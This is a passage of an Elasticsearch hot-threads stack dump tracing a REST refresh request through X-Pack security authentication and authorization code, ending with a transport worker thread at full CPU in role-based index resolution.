       app//org.elasticsearch.action.support.replication.TransportBroadcastReplicationAction.doExecute(TransportBroadcastReplicationAction.java:111)
       app//org.elasticsearch.action.support.replication.TransportBroadcastReplicationAction.doExecute(TransportBroadcastReplicationAction.java:52)
       app//org.elasticsearch.action.support.TransportAction$RequestFilterChain.proceed(TransportAction.java:179)
       app//org.elasticsearch.action.support.ActionFilter$Simple.apply(ActionFilter.java:53)
       app//org.elasticsearch.action.support.TransportAction$RequestFilterChain.proceed(TransportAction.java:177)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.lambda$apply$0(SecurityActionFilter.java:87)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter$$Lambda$4918/0x0000000801795550.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.lambda$authorizeRequest$4(SecurityActionFilter.java:173)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter$$Lambda$4923/0x0000000801796048.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$runRequestInterceptors$15(AuthorizationService.java:365)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5158/0x000000080182e2c8.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$1.doRun(ListenableFuture.java:112)
       app//org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37)
       app//org.elasticsearch.common.util.concurrent.EsExecutors$DirectExecutorService.execute(EsExecutors.java:226)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.notifyListener(ListenableFuture.java:106)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.lambda$done$0(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$$Lambda$4748/0x00000008017691d8.accept(Unknown Source)
       java.base@15/java.util.ArrayList.forEach(ArrayList.java:1511)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.done(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.BaseFuture.set(BaseFuture.java:144)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.onResponse(ListenableFuture.java:127)
       app//org.elasticsearch.action.StepListener.innerOnResponse(StepListener.java:62)
       app//org.elasticsearch.action.NotifyOnceListener.onResponse(NotifyOnceListener.java:40)
       org.elasticsearch.xpack.security.authz.interceptor.BulkShardRequestInterceptor.intercept(BulkShardRequestInterceptor.java:75)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$runRequestInterceptors$14(AuthorizationService.java:360)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5156/0x000000080182de68.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$1.doRun(ListenableFuture.java:112)
       app//org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37)
       app//org.elasticsearch.common.util.concurrent.EsExecutors$DirectExecutorService.execute(EsExecutors.java:226)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.notifyListener(ListenableFuture.java:106)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.lambda$done$0(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$$Lambda$4748/0x00000008017691d8.accept(Unknown Source)
       java.base@15/java.util.ArrayList.forEach(ArrayList.java:1511)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.done(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.BaseFuture.set(BaseFuture.java:144)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.onResponse(ListenableFuture.java:127)
       app//org.elasticsearch.action.StepListener.innerOnResponse(StepListener.java:62)
       app//org.elasticsearch.action.NotifyOnceListener.onResponse(NotifyOnceListener.java:40)
       org.elasticsearch.xpack.security.authz.interceptor.FieldAndDocumentLevelSecurityRequestInterceptor.intercept(FieldAndDocumentLevelSecurityRequestInterceptor.java:65)
       org.elasticsearch.xpack.security.authz.interceptor.UpdateRequestInterceptor.intercept(UpdateRequestInterceptor.java:23)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$runRequestInterceptors$14(AuthorizationService.java:360)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5156/0x000000080182de68.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$1.doRun(ListenableFuture.java:112)
       app//org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37)
       app//org.elasticsearch.common.util.concurrent.EsExecutors$DirectExecutorService.execute(EsExecutors.java:226)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.notifyListener(ListenableFuture.java:106)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.lambda$done$0(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$$Lambda$4748/0x00000008017691d8.accept(Unknown Source)
       java.base@15/java.util.ArrayList.forEach(ArrayList.java:1511)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.done(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.BaseFuture.set(BaseFuture.java:144)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.onResponse(ListenableFuture.java:127)
       app//org.elasticsearch.action.StepListener.innerOnResponse(StepListener.java:62)
       app//org.elasticsearch.action.NotifyOnceListener.onResponse(NotifyOnceListener.java:40)
       org.elasticsearch.xpack.security.authz.interceptor.IndicesAliasesRequestInterceptor.intercept(IndicesAliasesRequestInterceptor.java:106)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$runRequestInterceptors$14(AuthorizationService.java:360)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5156/0x000000080182de68.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$1.doRun(ListenableFuture.java:112)
       app//org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37)
       app//org.elasticsearch.common.util.concurrent.EsExecutors$DirectExecutorService.execute(EsExecutors.java:226)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.notifyListener(ListenableFuture.java:106)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.lambda$done$0(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$$Lambda$4748/0x00000008017691d8.accept(Unknown Source)
       java.base@15/java.util.ArrayList.forEach(ArrayList.java:1511)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.done(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.BaseFuture.set(BaseFuture.java:144)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.onResponse(ListenableFuture.java:127)
       app//org.elasticsearch.action.StepListener.innerOnResponse(StepListener.java:62)
       app//org.elasticsearch.action.NotifyOnceListener.onResponse(NotifyOnceListener.java:40)
       org.elasticsearch.xpack.security.authz.interceptor.FieldAndDocumentLevelSecurityRequestInterceptor.intercept(FieldAndDocumentLevelSecurityRequestInterceptor.java:65)
       org.elasticsearch.xpack.security.authz.interceptor.SearchRequestInterceptor.intercept(SearchRequestInterceptor.java:19)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$runRequestInterceptors$14(AuthorizationService.java:360)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5156/0x000000080182de68.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$1.doRun(ListenableFuture.java:112)
       app//org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37)
       app//org.elasticsearch.common.util.concurrent.EsExecutors$DirectExecutorService.execute(EsExecutors.java:226)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.notifyListener(ListenableFuture.java:106)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.lambda$done$0(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$$Lambda$4748/0x00000008017691d8.accept(Unknown Source)
       java.base@15/java.util.ArrayList.forEach(ArrayList.java:1511)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.done(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.BaseFuture.set(BaseFuture.java:144)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.onResponse(ListenableFuture.java:127)
       app//org.elasticsearch.action.StepListener.innerOnResponse(StepListener.java:62)
       app//org.elasticsearch.action.NotifyOnceListener.onResponse(NotifyOnceListener.java:40)
       org.elasticsearch.xpack.security.authz.interceptor.ResizeRequestInterceptor.intercept(ResizeRequestInterceptor.java:86)
       org.elasticsearch.xpack.security.authz.AuthorizationService.runRequestInterceptors(AuthorizationService.java:366)
       org.elasticsearch.xpack.security.authz.AuthorizationService.handleIndexActionAuthorizationResult(AuthorizationService.java:343)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$9(AuthorizationService.java:285)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5141/0x000000080182c878.accept(Unknown Source)
       org.elasticsearch.xpack.security.authz.AuthorizationService$AuthorizationResultListener.onResponse(AuthorizationService.java:641)
       org.elasticsearch.xpack.security.authz.AuthorizationService$AuthorizationResultListener.onResponse(AuthorizationService.java:616)
       app//org.elasticsearch.action.support.ContextPreservingActionListener.onResponse(ContextPreservingActionListener.java:43)
       org.elasticsearch.xpack.security.authz.RBACEngine.buildIndicesAccessControl(RBACEngine.java:541)
       org.elasticsearch.xpack.security.authz.RBACEngine.lambda$authorizeIndexAction$3(RBACEngine.java:321)
       org.elasticsearch.xpack.security.authz.RBACEngine$$Lambda$5145/0x000000080182d148.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.lambda$getAsync$0(AuthorizationService.java:678)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier$$Lambda$5147/0x000000080182d5a8.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.AuthorizationService.resolveIndexNames(AuthorizationService.java:579)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$6(AuthorizationService.java:273)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5149/0x000000080182da08.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.lambda$getAsync$0(AuthorizationService.java:678)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier$$Lambda$5147/0x000000080182d5a8.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.RBACEngine.loadAuthorizedIndices(RBACEngine.java:352)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$5(AuthorizationService.java:269)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5139/0x000000080182c428.getAsync(Unknown Source)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.getAsync(AuthorizationService.java:676)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$8(AuthorizationService.java:272)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5140/0x000000080182c650.getAsync(Unknown Source)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.getAsync(AuthorizationService.java:676)
       org.elasticsearch.xpack.security.authz.RBACEngine.lambda$authorizeIndexAction$4(RBACEngine.java:313)
       org.elasticsearch.xpack.security.authz.RBACEngine$$Lambda$5143/0x000000080182cce8.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.RBACEngine.authorizeIndexActionName(RBACEngine.java:337)
       org.elasticsearch.xpack.security.authz.RBACEngine.authorizeIndexAction(RBACEngine.java:310)
       org.elasticsearch.xpack.security.authz.AuthorizationService.authorizeAction(AuthorizationService.java:283)
       org.elasticsearch.xpack.security.authz.AuthorizationService.maybeAuthorizeRunAs(AuthorizationService.java:248)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorize$1(AuthorizationService.java:212)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$4818/0x0000000801616018.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.action.support.ContextPreservingActionListener.onResponse(ContextPreservingActionListener.java:43)
       org.elasticsearch.xpack.security.authz.RBACEngine.lambda$resolveAuthorizationInfo$1(RBACEngine.java:123)
       org.elasticsearch.xpack.security.authz.RBACEngine$$Lambda$4820/0x0000000801616478.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.store.CompositeRolesStore.getRoles(CompositeRolesStore.java:274)
       org.elasticsearch.xpack.security.authz.RBACEngine.getRoles(RBACEngine.java:129)
       org.elasticsearch.xpack.security.authz.RBACEngine.resolveAuthorizationInfo(RBACEngine.java:117)
       org.elasticsearch.xpack.security.authz.AuthorizationService.authorize(AuthorizationService.java:214)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.authorizeRequest(SecurityActionFilter.java:173)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.lambda$applyInternal$3(SecurityActionFilter.java:159)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter$$Lambda$4921/0x0000000801795be8.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$authenticateAsync$2(AuthenticationService.java:323)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4778/0x0000000801615bb8.accept(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$lookForExistingAuthentication$6(AuthenticationService.java:384)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4779/0x0000000801615df0.run(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lookForExistingAuthentication(AuthenticationService.java:395)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.authenticateAsync(AuthenticationService.java:320)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.access$000(AuthenticationService.java:261)
       org.elasticsearch.xpack.security.authc.AuthenticationService.authenticate(AuthenticationService.java:156)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.applyInternal(SecurityActionFilter.java:156)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.apply(SecurityActionFilter.java:108)
       app//org.elasticsearch.action.support.TransportAction$RequestFilterChain.proceed(TransportAction.java:177)
       app//org.elasticsearch.action.support.TransportAction.execute(TransportAction.java:155)
       app//org.elasticsearch.action.support.TransportAction.execute(TransportAction.java:83)
       app//org.elasticsearch.client.node.NodeClient.executeLocally(NodeClient.java:83)
       app//org.elasticsearch.client.node.NodeClient.doExecute(NodeClient.java:72)
       app//org.elasticsearch.client.support.AbstractClient.execute(AbstractClient.java:409)
       app//org.elasticsearch.client.support.AbstractClient$IndicesAdmin.execute(AbstractClient.java:1274)
       app//org.elasticsearch.client.support.AbstractClient$IndicesAdmin.refresh(AbstractClient.java:1585)
       app//org.elasticsearch.rest.action.admin.indices.RestRefreshAction.lambda$prepareRequest$0(RestRefreshAction.java:60)
       app//org.elasticsearch.rest.action.admin.indices.RestRefreshAction$$Lambda$5558/0x00000008018d4f50.accept(Unknown Source)
       app//org.elasticsearch.rest.BaseRestHandler.handleRequest(BaseRestHandler.java:115)
       org.elasticsearch.xpack.security.rest.SecurityRestFilter.lambda$handleRequest$0(SecurityRestFilter.java:76)
       org.elasticsearch.xpack.security.rest.SecurityRestFilter$$Lambda$5181/0x0000000801841200.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.support.SecondaryAuthenticator.lambda$authenticateAndAttachToContext$2(SecondaryAuthenticator.java:82)
       org.elasticsearch.xpack.security.authc.support.SecondaryAuthenticator$$Lambda$5197/0x0000000801843570.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.support.SecondaryAuthenticator.authenticate(SecondaryAuthenticator.java:92)
       org.elasticsearch.xpack.security.authc.support.SecondaryAuthenticator.authenticateAndAttachToContext(SecondaryAuthenticator.java:77)
       org.elasticsearch.xpack.security.rest.SecurityRestFilter.lambda$handleRequest$2(SecurityRestFilter.java:70)
       org.elasticsearch.xpack.security.rest.SecurityRestFilter$$Lambda$4978/0x0000000801796e20.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$writeAuthToContext$24(AuthenticationService.java:680)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$5171/0x000000080182fcb8.run(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.writeAuthToContext(AuthenticationService.java:695)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.finishAuthentication(AuthenticationService.java:669)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.consumeUser(AuthenticationService.java:616)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$consumeToken$16(AuthenticationService.java:493)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$5067/0x000000080181b2b0.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.action.support.ContextPreservingActionListener.onResponse(ContextPreservingActionListener.java:43)
       org.elasticsearch.xpack.core.common.IteratingActionListener.onResponse(IteratingActionListener.java:120)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$consumeToken$13(AuthenticationService.java:459)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$5092/0x000000080181d5c8.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm.lambda$authenticateWithCache$1(CachingUsernamePasswordRealm.java:146)
       org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm$$Lambda$5168/0x000000080182eda0.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm.handleCachedAuthentication(CachingUsernamePasswordRealm.java:197)
       org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm.lambda$authenticateWithCache$2(CachingUsernamePasswordRealm.java:138)
       org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm$$Lambda$5115/0x0000000801828b00.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$1.doRun(ListenableFuture.java:112)
       app//org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37)
       app//org.elasticsearch.common.util.concurrent.EsExecutors$DirectExecutorService.execute(EsExecutors.java:226)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.notifyListener(ListenableFuture.java:106)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.addListener(ListenableFuture.java:68)
       org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm.authenticateWithCache(CachingUsernamePasswordRealm.java:133)
       org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm.authenticate(CachingUsernamePasswordRealm.java:104)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$consumeToken$15(AuthenticationService.java:448)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$5060/0x000000080181a308.accept(Unknown Source)
       org.elasticsearch.xpack.core.common.IteratingActionListener.run(IteratingActionListener.java:102)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.consumeToken(AuthenticationService.java:503)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$5030/0x00000008018160c0.accept(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$extractToken$11(AuthenticationService.java:415)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$5051/0x0000000801818b08.run(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.extractToken(AuthenticationService.java:425)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$checkForApiKey$3(AuthenticationService.java:366)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$5014/0x0000000801813b88.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.ApiKeyService.authenticateWithApiKeyIfPresent(ApiKeyService.java:342)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.checkForApiKey(AuthenticationService.java:347)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$authenticateAsync$0(AuthenticationService.java:329)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4995/0x0000000801811438.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.TokenService.getAndValidateToken(TokenService.java:388)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$authenticateAsync$2(AuthenticationService.java:325)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4778/0x0000000801615bb8.accept(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$lookForExistingAuthentication$6(AuthenticationService.java:384)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4779/0x0000000801615df0.run(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lookForExistingAuthentication(AuthenticationService.java:395)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.authenticateAsync(AuthenticationService.java:320)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.access$000(AuthenticationService.java:261)
       org.elasticsearch.xpack.security.authc.AuthenticationService.authenticate(AuthenticationService.java:141)
       org.elasticsearch.xpack.security.authc.AuthenticationService.authenticate(AuthenticationService.java:126)
       org.elasticsearch.xpack.security.rest.SecurityRestFilter.handleRequest(SecurityRestFilter.java:63)
       app//org.elasticsearch.rest.RestController.dispatchRequest(RestController.java:236)
       app//org.elasticsearch.rest.RestController.tryAllHandlers(RestController.java:318)
       app//org.elasticsearch.rest.RestController.dispatchRequest(RestController.java:176)
       app//org.elasticsearch.http.AbstractHttpServerTransport.dispatchRequest(AbstractHttpServerTransport.java:318)
       app//org.elasticsearch.http.AbstractHttpServerTransport.handleIncomingRequest(AbstractHttpServerTransport.java:372)
       app//org.elasticsearch.http.AbstractHttpServerTransport.incomingRequest(AbstractHttpServerTransport.java:308)
       org.elasticsearch.http.netty4.Netty4HttpRequestHandler.channelRead0(Netty4HttpRequestHandler.java:42)
       org.elasticsearch.http.netty4.Netty4HttpRequestHandler.channelRead0(Netty4HttpRequestHandler.java:28)
       io.netty.channel.SimpleChannelInboundHandler.channelRead(SimpleChannelInboundHandler.java:99)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       org.elasticsearch.http.netty4.Netty4HttpPipeliningHandler.channelRead(Netty4HttpPipeliningHandler.java:58)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.handler.codec.MessageToMessageDecoder.channelRead(MessageToMessageDecoder.java:103)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.handler.codec.MessageToMessageDecoder.channelRead(MessageToMessageDecoder.java:103)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.handler.codec.MessageToMessageDecoder.channelRead(MessageToMessageDecoder.java:103)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.handler.codec.ByteToMessageDecoder.fireChannelRead(ByteToMessageDecoder.java:324)
       io.netty.handler.codec.ByteToMessageDecoder.channelRead(ByteToMessageDecoder.java:296)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.handler.timeout.IdleStateHandler.channelRead(IdleStateHandler.java:286)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.handler.ssl.SslHandler.unwrap(SslHandler.java:1518)
       io.netty.handler.ssl.SslHandler.decodeJdkCompatible(SslHandler.java:1267)
       io.netty.handler.ssl.SslHandler.decode(SslHandler.java:1314)
       io.netty.handler.codec.ByteToMessageDecoder.decodeRemovalReentryProtection(ByteToMessageDecoder.java:501)
       io.netty.handler.codec.ByteToMessageDecoder.callDecode(ByteToMessageDecoder.java:440)
       io.netty.handler.codec.ByteToMessageDecoder.channelRead(ByteToMessageDecoder.java:276)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.channel.DefaultChannelPipeline$HeadContext.channelRead(DefaultChannelPipeline.java:1410)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:919)
       io.netty.channel.nio.AbstractNioByteChannel$NioByteUnsafe.read(AbstractNioByteChannel.java:163)
       io.netty.channel.nio.NioEventLoop.processSelectedKey(NioEventLoop.java:714)
       io.netty.channel.nio.NioEventLoop.processSelectedKeysPlain(NioEventLoop.java:615)
       io.netty.channel.nio.NioEventLoop.processSelectedKeys(NioEventLoop.java:578)
       io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:493)
       io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:989)
       io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
       java.base@15/java.lang.Thread.run(Thread.java:832)

   100.4% (502.2ms out of 500ms) cpu usage by thread 'elasticsearch[42dc5d67f7823cd2bfaad53ab1985e1d42dc5d6][transport_worker][T#5]'
     4/10 snapshots sharing following 333 elements
       java.base@15/java.util.HashMap.put(HashMap.java:612)
       java.base@15/java.util.HashSet.add(HashSet.java:221)
       org.elasticsearch.xpack.security.authz.RBACEngine.resolveAuthorizedIndicesFromRole(RBACEngine.java:522)
       org.elasticsearch.xpack.security.authz.RBACEngine.loadAuthorizedIndices(RBACEngine.java:352)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$5(AuthorizationService.java:269)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5197/0x0000000801826710.getAsync(Unknown Source)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.getAsync(AuthorizationService.java:676)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$8(AuthorizationService.java:272)
